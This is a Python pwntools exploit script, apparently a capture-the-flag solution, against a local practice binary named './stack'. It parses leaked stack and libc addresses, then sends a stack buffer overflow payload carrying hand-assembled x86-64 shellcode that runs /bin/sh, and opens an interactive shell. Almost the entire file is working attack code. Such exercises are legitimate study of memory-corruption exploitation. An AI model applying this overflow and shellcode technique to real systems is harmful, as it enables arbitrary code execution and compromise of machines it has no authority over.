#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./stack
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./stack')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments
# RUNPATH:  b'.'

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
shellcode = b"\x48\x31\xd2" + \
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + \
    b"\x48\xc1\xeb\x08" + \
    b"\x53" + \
    b"\x48\x89\xe7" + \
    b"\x50" + \
    b"\x57" + \
    b"\x48\x89\xe6" + \
    b"\xb0\x3b" + \
    b"\x0f\x05"
io.recvuntil(b'base pointer: ')
bp = int(io.recvline(keepends=False),16)

io.recvuntil(b'will be stored: ')
buf = int(io.recvline(keepends=False),16)

io.recvuntil(b'libc: ')
lib_c = int(io.recvline(keepends=False),16)

padding = bp - buf + 8

rip = buf + 8

s = b'a'*padding + shellcode + struct.pack("<Q",rip)

io.sendline(s)

io.interactive()

